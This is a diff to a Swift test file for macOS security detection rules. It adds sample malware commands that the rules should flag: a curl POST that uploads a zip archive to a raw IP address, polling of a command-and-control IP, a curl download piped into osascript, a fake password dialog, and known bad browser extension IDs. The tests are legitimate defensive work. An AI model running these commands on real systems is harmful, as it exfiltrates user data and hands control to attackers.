@@ -22,6 +22,8 @@ struct StarterRuleTests {
         "ditto -c -k --sequesterRsrc /tmp/9556/ /tmp/out.zip",
         "osascript -e display dialog \"Application wants to install helper\" default answer \"\" with hidden answer",
         "curl -fsSL https://x.example/a.scpt | osascript",
+        "curl -X POST -H uuid: 162302ce3e3c4678 -H user: maxbloomberg -H buildid: agov --data-binary @/tmp/out.zip http://79.137.192.4/p2p",
+        "zip -r /tmp/shub_log.zip /tmp/shub_8f2a",
     ])
     func detectsStealerActivity(command: String) throws {
         #expect(try matches("process.stealer-activity", command))
@@ -31,6 +33,7 @@ struct StarterRuleTests {
         "curl -F file=@/Users/me/report.pdf https://upload.example",
         "ditto -c -k --sequesterRsrc --keepParent MyApp.app MyApp.zip",
         "osascript -e display dialog \"Done\"",
+        "curl --data-binary @/tmp/payload.json http://localhost:8080/api",
     ])
     func ignoresNormalCommands(command: String) throws {
         #expect(try !matches("process.stealer-activity", command))
@@ -39,6 +42,50 @@ struct StarterRuleTests {
     @Test func detectsAmosBackdoorLoop() throws {
         #expect(try matches("process.stealer-backdoor", "/bin/bash /Users/alex/.agent"))
         #expect(try !matches("process.stealer-backdoor", "/Users/alex/.agentrc-loader"))
+    }
+
+    @Test(arguments: [
+        "/bin/bash /Users/alex/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate",
+        "/bin/zsh /tmp/.c.sh",
+        "curl -s http://45.146.130.131/api/v1/bot/repeat/alex",
+        "curl -s http://45.146.130.131/v1/bot/joinsystem/",
+        "/tmp/socks",
+    ])
+    func detectsShubAndOdysseyBackdoors(command: String) throws {
+        #expect(try matches("process.stealer-backdoor", command))
+    }
+
+    @Test(arguments: [
+        "/Users/alex/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater --wake",
+        "/tmp/socks5-proxy --port 1080",
+        "ssh -D 1080 -S /tmp/socks host.example",
+        "curl https://api.example.com/v1/bots/actions",
+    ])
+    func ignoresGoogleUpdaterAndProxies(command: String) throws {
+        #expect(try !matches("process.stealer-backdoor", command))
+    }
+
+    @Test func detectsShubLaunchItemButNotGoogleUpdaters() throws {
+        #expect(try matches("launch.shub-fake-google-updater", "/Users/alex/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate"))
+        #expect(try !matches("launch.shub-fake-google-updater", "/Users/alex/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Resources/GoogleSoftwareUpdateAgent.app/Contents/MacOS/GoogleSoftwareUpdateAgent -runMode ifneeded"))
+        #expect(try !matches("launch.shub-fake-google-updater", "/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater --wake-all --system"))
+        #expect(try !matches("launch.shub-fake-google-updater", "/Users/alex/Library/LaunchAgents/com.google.keystone.agent.plist"))
+    }
+
+    @Test(arguments: [
+        ("extension.cyberhaven-campaign-2024-12", "nnpnnpemnckcfdebeekibpiijlicmpom"),
+        ("extension.cyberhaven-campaign-2024-12-fixed", "pajkjnmeojmbapicmbpliphjmcekeaac"),
+        ("extension.csp-stripping-2025-02", "gdocgbfmddcfnlnpmnghmjicjognhonm"),
+        ("extension.reddirection-2025-07", "eokjikchkppnkdipbiggnmlkahcdkikp"),
+        ("extension.shadypanda-2025-12", "mljmfnkjmcdmongjnnnbbnajjdbojoci"),
+    ])
+    func flagsKnownBadExtensionsByIDOnly(ruleID: String, extensionID: String) throws {
+        let rule = try #require(rulebook.rules.first { $0.id == ruleID })
+        #expect((rule.patterns ?? []).allSatisfy { $0.range(of: #"^\^browser=\\S\{1,32\} id=[a-p]{32}\\s$"#, options: .regularExpression) != nil })
+        #expect(try matches(ruleID, "browser=Chrome id=\(extensionID) name=Helper update=https://clients2.google.com/service/update2/crx permissions=storage"))
+        #expect(try matches(ruleID, "browser=Edge id=\(extensionID) name=Helper update=none permissions="))
+        #expect(try !matches(ruleID, "browser=Chrome id=abcdefghijklmnopabcdefghijklmnop name=\(extensionID) update=none permissions="))
+        #expect(try !matches(ruleID, "browser=Chrome id=a\(extensionID) name=Helper update=none permissions="))
     }
 
     @Test func flagsOnlyExtensionsOutsideOfficialStores() throws {
